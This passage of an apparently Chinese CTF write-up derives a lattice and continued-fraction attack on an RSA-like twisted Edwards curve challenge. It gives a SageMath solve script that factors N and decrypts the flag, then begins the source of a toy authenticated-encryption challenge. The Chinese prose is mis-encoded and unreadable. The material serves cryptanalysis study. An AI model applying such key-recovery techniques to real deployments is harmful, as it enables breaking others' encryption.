class="name">int</span>(((<span class="name">p</span> + <span class="number">1</span>) * (q + 1) * <span class="number">3</span> * (p + q) - (p - q) * int(<span class="name">N**0</span>.<span class="number">21</span>)) * y / (x * <span class="number">3</span> * (p + q))), int(((p + 1) * (<span class="name">q</span> + <span class="number">1</span>) * 3 * (<span class="name">p</span> + q) + (<span class="name">p</span> - q) * int(N**0.21)) * y / (<span class="name">x</span> * 3 * (<span class="name">p</span> + q))) )</span><br></pre></td></tr></table></figure><p>å³$\frac{((p+1) * (q+1) * 3 * (p+q)-(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}&lt;e&lt;\frac{((p+1) * (q+1) * 3 * (p+q)+(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}$</p><p>å³$ex-(p+1) * (q+1) * y&lt;\frac{|(p-q) * N^{0.21}|}{3(p+q)} * y$</p><p>è¿™ä¸ªèŒƒå›´ä¸paperä¸­ç»™å®šçš„$|z|&lt;\frac{|p-q|}{3(p+q)}N^{\frac{1}{4}}y$å¾ˆç±»ä¼¼äº†ï¼Œå°±æ˜¯paperé‡Œå¤´æ˜¯ç”¨çš„$\phi(N)$ï¼Œè€Œé¢˜ç›®ç”¨çš„æ˜¯(p+1)(q+1)ï¼Œä½†é—®é¢˜ä¸å¤§</p><p>$ex-(p+1) * (q+1) * y = z$</p><p>$ex - y(N + 1 + p + q) = z$</p><p>$\frac{ex}{y}-N-p-q-1 = \frac{z}{y}$</p><p>$\frac{ex}{y}-N-1 - \frac{z}{y} = p + q$</p><p>ç®—ä¸€ä¸‹$\frac{z}{y}$å³$\frac{|p-q|}{3(p+q)}N^{0.21}$çš„å¤§å°ï¼Œçº¦ä¸º2048 * 0.21 = 430bit</p><p>ç°åœ¨å§‘ä¸”æˆ‘ä»¬æŠŠ$T =  \frac{ex}{y}-N-1$çœ‹ä½œæ˜¯p+qï¼Œç„¶åè®¡ç®—$\rho = \frac{T+\sqrt{T^2 -4N}}{2}$ï¼Œ$\rho$ä½œä¸ºpçš„ä¸€ä¸ªè¿‘ä¼¼ï¼Œå…¶ä¸­å¤§çº¦ä½430bitæ˜¯ä¸å‡†ç¡®çš„ã€‚</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦ç”¨åˆ°RSAå¯†ç ç³»ç»Ÿä¸­ç”¨åˆ°è¿‡çš„<a href="https://www.anquanke.com/post/id/213821" target="_blank" rel="noopener">Factoring with high bits known</a>ï¼Œ</p><p><img src="https://i.loli.net/2020/12/17/fuX63akFOD4iSeg.png" alt="image-20201102192520897"></p><p>æ˜¾ç„¶è¿™é‡Œæœ‰430bitçš„ä¸ç¡®å®šä½æ•°æ˜¯æ»¡è¶³è¿™ä¸ªå…³ç³»çš„ï¼Œäºæ˜¯åˆ©ç”¨è¿™ä¸ªç®—æ³•æˆ‘ä»¬æœ€ç»ˆèƒ½æˆåŠŸçš„åˆ†è§£å‡ºpï¼Œqæ¥</p><p>ç„¶åå°±èƒ½ç®—å‡ºè¿™ä¸ªç§é’¥äº†ã€‚</p><p>æœ‰äº†ç§é’¥äº†ï¼Œè¿™ä¸ªæ›²çº¿æ€ä¹ˆç®—å‘¢ï¼Ÿ</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = (((pt<span class="string">[1]</span>)**<span class="number">2</span> - <span class="number">1</span>) * inverse_mod(((pt<span class="string">[1]</span>)**<span class="number">2</span> + <span class="number">1</span>) * (pt<span class="string">[0]</span>)**<span class="number">2</span>, N)) % N</span><br><span class="line">    </span><br><span class="line">    # <span class="number">2000</span> years later...:)</span><br><span class="line">for _ in range(e):</span><br><span class="line">        ct = ( int((ct<span class="string">[0]</span> * pt<span class="string">[1]</span> + ct<span class="string">[1]</span> * pt<span class="string">[0]</span>) * inverse_mod(<span class="number">1</span> + d * ct<span class="string">[0]</span> * pt<span class="string">[0]</span> * ct<span class="string">[1]</span> * pt<span class="string">[1]</span>, N) % N), int((ct<span class="string">[1]</span> * pt<span class="string">[1]</span> + d * ct<span class="string">[0]</span> * pt<span class="string">[0]</span>) * inverse_mod(<span class="number">1</span> - d * ct<span class="string">[0]</span> * pt<span class="string">[0]</span> * ct<span class="string">[1]</span> * pt<span class="string">[1]</span>, N) % N) )</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªç³»æ•°dï¼Œé¦–å…ˆè¦è®¡ç®—å‡ºè¿™ä¸ªç³»æ•°d</p><p>è¿™ä¸ªç³»æ•°dçš„è®¡ç®—è¦åˆ©ç”¨åˆ°é¢˜ç›®ç»™çš„ctï¼Œ</p><p>é¦–å…ˆçœ‹åˆ°æ‰­æ›²çˆ±å¾·åæ›²çº¿çš„å®šä¹‰å¼</p><p><img src="https://i.loli.net/2020/12/17/2XckCxZilOrKMwt.png" alt="image-20201102193536643"></p><p>é’ˆå¯¹è¿™ä¸€æ¡æ›²çº¿çš„åŠ æ³•å…¬å¼æ˜¯</p><p><img src="https://i.loli.net/2020/12/17/qNTdBZHuekX2nAJ.png" alt="image-20201102193604325"></p><p>é’ˆå¯¹è¿™ä¸€é“é¢˜ä»–ä»£ç é‡Œçš„é‚£ä¸ªåŠ æ³•å¼å­ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œè¿™é‡Œç›¸å½“äºæ˜¯æ‰­æ›²çˆ±å¾·åæ›²çº¿çš„ç³»æ•°a = -d</p><p>é‚£ä¹ˆå†é…ä¸Šä¸€ä¸ªåæ ‡(x,y)ï¼Œæˆ‘ä»¬å°±èƒ½è®¡ç®—å‡ºç³»æ•°däº†ã€‚</p><p>å…¶å®è¿™é‡Œå¯ä»¥åšä¸€ä¸ªæ€è€ƒï¼Œè¿™ä¸ªç³»æ•°dæ˜¯æœ‰å•¥ç”¨ï¼Ÿ</p><p>æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªæºç é‡Œè¿™ä¸ªç³»æ•°dçš„ç”Ÿæˆä»£ç <code>d = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N</code></p><p>è¿™é‡Œpt[0],pt[1]æ˜¯flagæ˜æ–‡å‰åä¸¤æ®µçš„åè¿›åˆ¶æ•°è¡¨ç¤ºï¼Œæ‰€ä»¥dæ˜¯ç”±flagæ˜æ–‡å†³å®šçš„ã€‚</p><p>æˆ‘ä»¬å†å˜æ¢ä¸Šè¿°æ‰­æ›²çˆ±å¾·åæ›²çº¿çš„æ–¹ç¨‹ï¼š</p><p>$ax^2 + y^2 = 1 + dx^2y^2$</p><p>$dx^2y^2+dx^2=y^2 - 1$</p><p>$d(x^2(y^2+1))=y^2 - 1$</p><p>$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$</p><p>å¯ä»¥å‘ç°å°±æ˜¯è¿™ä¸ªç”Ÿæˆä»£ç çš„æ–¹ç¨‹å¼ï¼Œpt[1]ä»£è¡¨yï¼Œpt[0]ä»£è¡¨x</p><p>æ‰€ä»¥å…¶å®è¿™ä¸ªç³»æ•°dçš„ä½œç”¨å°±æ˜¯ä¿è¯flagæ‰€ä»£è¡¨çš„ç‚¹åœ¨è¿™æ¡æ›²çº¿ä¸Šã€‚</p><p>å¥½äº†ï¼Œç³»æ•°dä¹Ÿç®—å‡ºæ¥äº†ï¼Œæ€ä¹ˆåˆ©ç”¨ç§é’¥æ¥è§£å¯†å‘¢ï¼Ÿ</p><p>æ˜¾ç„¶ä¸å¯èƒ½ç›´æ¥åˆ©ç”¨åŸæ¥é‡Œçš„è¿™ä¸ªå¾ªç¯å»åŠ ä¸Šè¿™äº›ç‚¹ï¼Œ</p><p>ä¿¡å®‰æ•°åŸºä¸­å°±æåˆ°è¿‡çš„é‡å¤å€åŠ ç®—æ³•äº†è§£ä¸€ä¸‹å’¯~</p><h4 id="è§£é¢˜æµç¨‹-1"><a href="#è§£é¢˜æµç¨‹-1" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h4><p>æ‰€ä»¥è¿™é“é¢˜çš„æ•´ä¸ªè§£é¢˜æµç¨‹ï¼š</p><ol><li>åˆ©ç”¨è¿åˆ†æ•°å¾—åˆ°xï¼Œyï¼ˆè‡³äºæ€ä¹ˆç¡®å®šxï¼Œy. å¯ä»¥æ ¹æ®å¾—åˆ°çš„xï¼Œyçš„bitä½æ•°ï¼Œæˆ–è€…ç”¨xï¼Œyè®¡ç®—å‡ºæ¥çš„Tçš„bitä½æ•°æ¥åˆ¤æ–­ï¼‰</li><li>åˆ©ç”¨Factoring with high bits known åˆ†è§£å‡ºpï¼Œq</li><li>è®¡ç®—ç§é’¥ prikey = inverse(e , (p+1) * (q+1))</li><li>è®¡ç®—ç³»æ•°$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$</li><li>åˆ©ç”¨é‡å¤å€åŠ ç®—æ³•åšä¸€ä¸ªä¹˜æ³•è®¡ç®— mt = d * ct</li></ol><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">e</span>,<span class="keyword">N</span>=(,)</span><br><span class="line"><span class="keyword">c</span> = continued_fraction(<span class="keyword">e</span>/<span class="keyword">N</span>)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="keyword">c</span>)):</span><br><span class="line">    <span class="keyword">y</span>=<span class="keyword">c</span>.numerator(i)</span><br><span class="line">    <span class="keyword">x</span>=<span class="keyword">c</span>.denominator(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">y</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    T = <span class="keyword">e</span>*<span class="keyword">x</span>//<span class="keyword">y</span>-<span class="keyword">N</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">1023</span>&lt;(<span class="keyword">int</span>(T).bit_length()) &lt; <span class="number">1026</span>:#æ ¹æ®Tçš„bitä½æ•°æ¥ç¡®å®š<span class="keyword">x</span>,<span class="keyword">y</span></span><br><span class="line">        <span class="keyword">print</span>(T)</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">x</span>,<span class="keyword">int</span>(<span class="keyword">x</span>).bit_length())</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">y</span>,<span class="keyword">int</span>(<span class="keyword">y</span>).bit_length())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">from gmpy2 import *#Factoring with high bits known</span><br><span class="line">_p = (T+iroot(T^<span class="number">2</span>-<span class="number">4</span>*<span class="keyword">N</span>,<span class="keyword">int</span>(<span class="number">2</span>))[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">p</span> = <span class="keyword">int</span>(_p)</span><br><span class="line">n=<span class="keyword">N</span></span><br><span class="line">kbits = <span class="number">430</span></span><br><span class="line">PR.<span class="symbol">&lt;x&gt;</span> = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">f</span> = <span class="keyword">x</span> + <span class="keyword">p</span></span><br><span class="line">x0 = <span class="keyword">f</span>.small_roots(<span class="keyword">X</span>=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">p</span> = <span class="keyword">p</span>+x0</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"p: "</span>, <span class="keyword">p</span>)</span><br><span class="line">assert n % <span class="keyword">p</span> == <span class="number">0</span></span><br><span class="line">q = n/<span class="keyword">int</span>(<span class="keyword">p</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"q: "</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>,<span class="keyword">y</span>=(,)</span><br><span class="line"></span><br><span class="line">#-d*<span class="keyword">x</span>*^<span class="number">2</span> +<span class="keyword">y</span>^<span class="number">2</span> = <span class="number">1</span>+d*<span class="keyword">x</span>^<span class="number">2</span>*<span class="keyword">y</span>^<span class="number">2</span></span><br><span class="line"></span><br><span class="line">d = (<span class="number">1</span>-<span class="keyword">y</span>^<span class="number">2</span>)*inverse_mod(-<span class="keyword">x</span>^<span class="number">2</span>*<span class="keyword">y</span>^<span class="number">2</span>-<span class="keyword">x</span>^<span class="number">2</span>,<span class="keyword">N</span>)%<span class="keyword">N</span>#è®¡ç®—ç³»æ•°d</span><br><span class="line">e_inv = inverse_mod(<span class="keyword">int</span>(<span class="keyword">e</span>),<span class="keyword">int</span>((<span class="keyword">int</span>(<span class="keyword">p</span>)+<span class="number">1</span>)*(<span class="keyword">int</span>(q)+<span class="number">1</span>)))#è®¡ç®—ç§é’¥prikey</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(ct,<span class="keyword">pt</span>):#é‡å¤å€åŠ ç®—æ³•çš„å®ç°</span><br><span class="line">    ct = ( <span class="keyword">int</span>((ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>), <span class="keyword">int</span>((ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> - d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>) )</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line">def mul_by_double_adding(ct,n):</span><br><span class="line">    <span class="keyword">pt</span> = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">pt</span> = <span class="built_in">add</span>(ct, <span class="keyword">pt</span>)</span><br><span class="line">        ct = <span class="built_in">add</span>(ct, ct)</span><br><span class="line">        n = n&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">pt</span></span><br><span class="line">(<span class="keyword">x</span>,<span class="keyword">y</span>)=mul_by_double_adding((<span class="keyword">x</span>,<span class="keyword">y</span>),e_inv)#è·å–mtï¼Œå¾—åˆ°flag</span><br><span class="line">from Crypto.Util.<span class="keyword">number</span> import long_to_bytes</span><br><span class="line"><span class="keyword">print</span>(long_to_bytes(<span class="keyword">x</span>)+long_to_bytes(<span class="keyword">y</span>))</span><br></pre></td></tr></table></figure><h3 id="imposter"><a href="#imposter" class="headerlink" title="imposter"></a>imposter</h3><p>Toy_AE.py</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">import</span> os</span><br><span class="line"><span class="symbol">from</span> Crypto.Cipher <span class="meta">import</span> AES</span><br><span class="line"><span class="symbol">from</span> Crypto.Util.<span class="keyword">strxor </span><span class="meta">import</span> <span class="keyword">strxor</span></span><br><span class="line"><span class="keyword">from </span>Crypto.Util.number <span class="meta">import</span> long_to_bytes, <span class="keyword">bytes_to_long</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">class </span>Toy_AE():</span><br><span class="line">    def __init__(<span class="keyword">self):</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.block_size </span>= <span class="number">16</span></span><br><span class="line">        <span class="keyword">self.n_size </span>= <span class="keyword">self.block_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.delta </span>= <span class="keyword">b'\x00' </span>* <span class="keyword">self.block_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.init_cipher()</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"> </span>   def init_cipher(<span class="keyword">self):</span></span><br><span class="line"><span class="keyword"> </span>       key = os.urandom(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self.cipher </span>= AES.new(key = key, mode = AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    def pad(<span class="keyword">self, </span>m, <span class="keyword">block_size):</span></span><br><span class="line"><span class="keyword"> </span>       return m <span class="meta">if</span> len(m) == <span class="keyword">block_size </span><span class="meta">else</span> (m + <span class="keyword">b'\x80' </span>+ (<span class="keyword">b'\x00' </span>* (<span class="keyword">block_size </span>- <span class="number">1</span> - len(m))))</span><br><span class="line"></span><br><span class="line">    def GF2_mul(<span class="keyword">self, </span>a, <span class="keyword">b, </span>n_size):</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        for <span class="keyword">bit </span>in <span class="keyword">bin(a)[2:]:</span></span><br><span class="line"><span class="keyword"> </span>           s = s &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="meta">if</span> <span class="keyword">bit </span>== <span class="string">'1'</span>:</span><br><span class="line">                s ^= <span class="keyword">b</span></span><br><span class="line"><span class="keyword"> </span>       upper = <span class="keyword">bytes_to_long(long_to_bytes(s)[:-n_size])</span></span><br><span class="line"><span class="keyword"> </span>       lower = <span class="keyword">bytes_to_long(long_to_bytes(s)[-n_size:])</span></span><br><span class="line"><span class="keyword"> </span>       return upper ^ lower</span><br><span class="line"></span><br><span class="line">    def encrypt(<span class="keyword">self, </span>msg):</span><br><span class="line">        return <span class="keyword">self.A_EF(msg)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"> </span>   def decrypt(<span class="keyword">self, </span>ct, _te):</span><br><span class="line">        msg, te = <span class="keyword">self.A_DF(ct)</span></span><br><span class="line"><span class="keyword"> </span>       return msg <span class="meta">if</span> _te == te <span class="meta">else</span> None</span><br><span class="line"></span><br><span class="line">    def A_EF(<span class="keyword">self, </span>msg):</span><br><span class="line">        <span class="keyword">self.Sigma </span>= <span class="keyword">b'\x00' </span>* <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.L </span>= <span class="keyword">self.cipher.encrypt(b'ConvenienceFixed')</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.delta </span>= <span class="keyword">b'DeltaConvenience'</span></span><br><span class="line"><span class="keyword"> </span>       m = len(msg) // <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       m += <span class="number">1</span> <span class="meta">if</span> (len(msg) % <span class="keyword">self.n_size) </span><span class="meta">else</span> <span class="number">0</span></span><br><span class="line">        M_list = [msg[i * <span class="keyword">self.n_size </span>: (i + <span class="number">1</span>) * <span class="keyword">self.n_size] </span>for i in range(m)]</span><br><span class="line">        C_list = []</span><br><span class="line">        for i in range(<span class="number">0</span>, (m-<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">            <span class="built_in">C1</span>, <span class="built_in">C2</span> = <span class="keyword">self.feistel_enc_2r(M_list[2*i], </span>M_list[<span class="number">2</span>*i +<span class="number">1</span>])</span><br><span class="line">            C_list.append(<span class="built_in">C1</span>)</span><br><span class="line">            C_list.append(<span class="built_in">C2</span>)</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(M_list[2*i </span>+<span class="number">1</span>], <span class="keyword">self.Sigma)</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= long_to_bytes(<span class="keyword">self.GF2_mul(2, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>       <span class="meta">if</span> m &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            Z = <span class="keyword">self.cipher.encrypt(strxor(self.L, </span>M_list[-<span class="number">2</span>]))</span><br><span class="line">            Cm  =  <span class="keyword">strxor(Z[:len(M_list[-1])], </span>M_list[-<span class="number">1</span>])</span><br><span class="line">            Cm_1 = <span class="keyword">strxor(self.cipher.encrypt(strxor(strxor(self.L, </span><span class="keyword">self.delta), </span><span class="keyword">self.pad(Cm, </span><span class="keyword">self.block_size))), </span>M_list[-<span class="number">2</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">strxor(Z, </span><span class="keyword">self.pad(Cm, </span><span class="keyword">self.block_size)))</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= <span class="keyword">strxor(self.L, </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>           C_list.append(Cm_1)</span><br><span class="line">            C_list.append(Cm)</span><br><span class="line"><span class="symbol">        else:</span></span><br><span class="line">            Cm = <span class="keyword">strxor(self.cipher.encrypt(self.L)[:len(M_list[-1])], </span>M_list[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">self.pad(M_list[-1], </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>           C_list.append(Cm)</span><br><span class="line">        <span class="meta">if</span> len(M_list[-<span class="number">1</span>]) == <span class="keyword">self.n_size:</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">multer </span>= <span class="keyword">strxor(long_to_bytes(self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size)), </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>       <span class="meta">else</span>:</span><br><span class="line">            <span class="keyword">multer </span>= long_to_bytes(<span class="keyword">self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>       TE = <span class="keyword">self.cipher.encrypt(strxor(self.Sigma, </span><span class="keyword">multer))</span></span><br><span class="line"><span class="keyword"> </span>       return <span class="keyword">b''.join(C_list), </span>TE</span><br><span class="line"></span><br><span class="line">    def A_DF(<span class="keyword">self, </span>ct):</span><br><span class="line">        <span class="keyword">self.Sigma </span>= <span class="keyword">b'\x00' </span>* <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.L </span>= <span class="keyword">self.cipher.encrypt(b'ConvenienceFixed')</span></span><br><span class="line"><span class="keyword"> </span>       <span class="keyword">self.delta </span>= <span class="keyword">b'DeltaConvenience'</span></span><br><span class="line"><span class="keyword"> </span>       m = len(ct) // <span class="keyword">self.n_size</span></span><br><span class="line"><span class="keyword"> </span>       m += <span class="number">1</span> <span class="meta">if</span> (len(ct) % <span class="keyword">self.n_size) </span><span class="meta">else</span> <span class="number">0</span></span><br><span class="line">        C_list = [ct[i * <span class="keyword">self.n_size </span>: (i + <span class="number">1</span>) * <span class="keyword">self.n_size] </span>for i in range(m)]</span><br><span class="line">        M_list = []</span><br><span class="line">        for i in range(<span class="number">0</span>, (m-<span class="number">1</span>) // <span class="number">2</span>):</span><br><span class="line">            M1, M2 = <span class="keyword">self.feistel_dec_2r(C_list[2*i], </span>C_list[<span class="number">2</span>*i +<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(M2 </span>,<span class="keyword">self.Sigma)</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= long_to_bytes(<span class="keyword">self.GF2_mul(2, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>           M_list.append(M1)</span><br><span class="line">            M_list.append(M2)</span><br><span class="line">        <span class="meta">if</span> m &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            Mm_1 = <span class="keyword">strxor(self.cipher.encrypt(strxor(strxor(self.L, </span><span class="keyword">self.delta), </span><span class="keyword">self.pad(C_list[-1], </span><span class="keyword">self.block_size))), </span>C_list[-<span class="number">2</span>])</span><br><span class="line">            Z = <span class="keyword">self.cipher.encrypt(strxor(self.L, </span>Mm_1))</span><br><span class="line">            Mm = <span class="keyword">strxor(Z[:len(C_list[-1])], </span>C_list[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">strxor(Z, </span><span class="keyword">self.pad(C_list[-1], </span><span class="keyword">self.block_size)))</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">self.L </span>= <span class="keyword">strxor(self.L, </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>           M_list.append(Mm_1)</span><br><span class="line">            M_list.append(Mm)</span><br><span class="line"><span class="symbol">        else:</span></span><br><span class="line">            Mm = <span class="keyword">strxor(self.cipher.encrypt(self.L)[:len(C_list[-1])], </span>C_list[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">self.Sigma </span>= <span class="keyword">strxor(self.Sigma, </span><span class="keyword">self.pad(Mm, </span><span class="keyword">self.block_size))</span></span><br><span class="line"><span class="keyword"> </span>           M_list.append(Mm)</span><br><span class="line">        <span class="meta">if</span> len(C_list[-<span class="number">1</span>]) == <span class="keyword">self.n_size:</span></span><br><span class="line"><span class="keyword"> </span>           <span class="keyword">multer </span>= <span class="keyword">strxor(long_to_bytes(self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size)), </span><span class="keyword">self.delta)</span></span><br><span class="line"><span class="keyword"> </span>       <span class="meta">else</span>:</span><br><span class="line">            <span class="keyword">multer </span>= long_to_bytes(<span class="keyword">self.GF2_mul(3, </span><span class="keyword">bytes_to_long(self.L), </span><span class="keyword">self.n_size))</span></span><br><span class="line"><span class="keyword"> </span>       TE = <span class="keyword">self.cipher.encrypt(strxor(self.Sigma, </span><span class="keyword">multer))</span></span><br><span class="line"><span class="keyword"> </span>       return <span class="keyword">b''.join(M_list), </span>TE</span><br><span class="line"></span><br><span class="line">    def feistel_enc_2r(<span class="keyword">self, </span>M1, M2):</span><br><span class="line">        <span class="built_in">C1</span> = <span 